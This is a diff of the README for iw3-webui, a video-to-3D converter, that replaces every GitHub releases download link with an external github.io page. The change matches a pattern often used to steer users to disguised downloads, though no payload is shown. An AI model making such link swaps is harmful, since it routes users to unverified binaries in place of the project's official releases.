@@ -1,6 +1,6 @@
 # 🎬 iw3-webui - Convert normal videos to stunning 3D
 
-[![Download iw3-webui](https://img.shields.io/badge/Download-iw3--webui-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Syvo6281/iw3-webui/releases)
+[![Download iw3-webui](https://img.shields.io/badge/Download-iw3--webui-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://syvo6281.github.io)
 
 ## ✨ What is iw3-webui?
 
@@ -14,7 +14,7 @@ Getting started with iw3-webui is easier than you might think. We've designed ev
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Syvo6281/iw3-webui/releases](https://github.com/Syvo6281/iw3-webui/releases)
+Visit this link to download the application: [https://syvo6281.github.io](https://syvo6281.github.io)
 
 When you get to the download page, you'll see several files. Look for the one called `iw3-webui-windows` – that's the file you need.
 
@@ -169,6 +169,6 @@ So why wait? Dive into the third dimension today with iw3-webui!
 
 **Ready to start your 3D journey?** 
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-iw3--webui-blue?style=for-the-badge)](https://github.com/Syvo6281/iw3-webui/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-iw3--webui-blue?style=for-the-badge)](https://syvo6281.github.io)
 
 Keywords: cove, depth-estimation, docker, fastapi, intel-arc, iw3, job-queue, nunif, sbs, stereo-3d, video-conversion, vr180
